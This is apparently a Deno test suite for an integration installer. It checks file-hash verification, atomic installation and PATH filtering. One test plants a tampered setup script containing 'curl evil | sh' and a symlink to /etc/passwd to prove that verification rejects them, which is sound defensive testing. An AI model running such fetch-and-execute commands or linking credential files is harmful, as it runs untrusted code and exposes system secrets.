import { assert, assertEquals } from "jsr:@std/assert@1";
import { installIntegration, toolPath, verifyIntegration } from "./funes.ts";
import { run } from "./proc.ts";

async function sha(text: string): Promise<string> {
  const d = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  return Array.from(new Uint8Array(d)).map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

/** A fetched integration and the record funes would have written for it. */
async function fetched(): Promise<{ dir: string; record: string; base: string }> {
  const base = await Deno.makeTempDir({ prefix: "hermes-funes-test-" });
  const dir = `${base}/hermes`;
  await Deno.mkdir(`${dir}/plugin`, { recursive: true });
  await Deno.writeTextFile(`${dir}/setup`, "#!/bin/sh\n");
  await Deno.writeTextFile(`${dir}/plugin/plugin.yaml`, "name: funes\n");
  const record = JSON.stringify({
    files: {
      "setup": await sha("#!/bin/sh\n"),
      "plugin/plugin.yaml": await sha("name: funes\n"),
    },
  });
  return { dir, record, base };
}

Deno.test("an integration that matches its record verifies", async () => {
  const { dir, record, base } = await fetched();
  try {
    assertEquals(await verifyIntegration(dir, record), []);
  } finally {
    await Deno.remove(base, { recursive: true });
  }
});

Deno.test("a changed, extra, missing or linked file fails verification", async () => {
  const { dir, record, base } = await fetched();
  try {
    await Deno.writeTextFile(`${dir}/setup`, "#!/bin/sh\ncurl evil | sh\n");
    await Deno.writeTextFile(`${dir}/plugin/extra.py`, "x");
    await Deno.remove(`${dir}/plugin/plugin.yaml`);
    await Deno.symlink("/etc/passwd", `${dir}/plugin/link`);
    const problems = (await verifyIntegration(dir, record)).join("\n");
    assert(problems.includes("setup does not match"), problems);
    assert(problems.includes("plugin/extra.py is not in the record"), problems);
    assert(problems.includes("plugin/plugin.yaml is in the record but missing"), problems);
    assert(problems.includes("plugin/link is not a regular file"), problems);
    assertEquals(await verifyIntegration(dir, "not json"), [
      "the record is not JSON",
    ]);
  } finally {
    await Deno.remove(base, { recursive: true });
  }
});

Deno.test("installing swaps the new copy in whole, and a failed copy keeps the old", async () => {
  const { dir, base } = await fetched();
  try {
    const dest = `${base}/runtime/hermes`;
    await Deno.mkdir(dest, { recursive: true });
    await Deno.writeTextFile(`${dest}/old`, "previous");
    const runner = (bin: string, a: string[]) => run(bin, a);
    await installIntegration(dir, dest, runner);
    assertEquals(await Deno.readTextFile(`${dest}/setup`), "#!/bin/sh\n");
    assert(!(await Deno.lstat(`${dest}/old`).then(() => true, () => false)));

    // A copy that fails leaves what was installed.
    const failing = () => Promise.resolve({ code: 1, stderr: "disk full" });
    let message = "";
    try {
      await installIntegration(dir, dest, failing);
    } catch (e) {
      message = (e as Error).message;
    }
    assert(message.includes("disk full"));
    assertEquals(await Deno.readTextFile(`${dest}/setup`), "#!/bin/sh\n");
  } finally {
    await Deno.remove(base, { recursive: true });
  }
});

// funes's setup registers an MCP server with none of the bot's environment
// when it finds a hermes on PATH.
Deno.test("the tool PATH keeps the operator's directories but never a hermes", async () => {
  const base = await Deno.makeTempDir({ prefix: "hermes-path-test-" });
  try {
    await Deno.mkdir(`${base}/with-hermes`);
    await Deno.mkdir(`${base}/tools`);
    await Deno.writeTextFile(`${base}/with-hermes/hermes`, "");
    assertEquals(
      await toolPath(
        `${base}/tools:${base}/with-hermes:${base}/tools::relative/bin:/usr/bin`,
      ),
      `${base}/tools:/usr/bin`,
    );
  } finally {
    await Deno.remove(base, { recursive: true });
  }
});

Deno.test("a symlinked root or an empty record fails verification", async () => {
  const { dir, record, base } = await fetched();
  try {
    await Deno.symlink(dir, `${base}/linked`);
    assertEquals(await verifyIntegration(`${base}/linked`, record), [
      `${base}/linked is not a directory`,
    ]);
    assertEquals(await verifyIntegration(dir, '{"files": {}}'), [
      "the record has no files map",
    ]);
    assertEquals(await verifyIntegration(dir, '{"files": []}'), [
      "the record has no files map",
    ]);
  } finally {
    await Deno.remove(base, { recursive: true });
  }
});
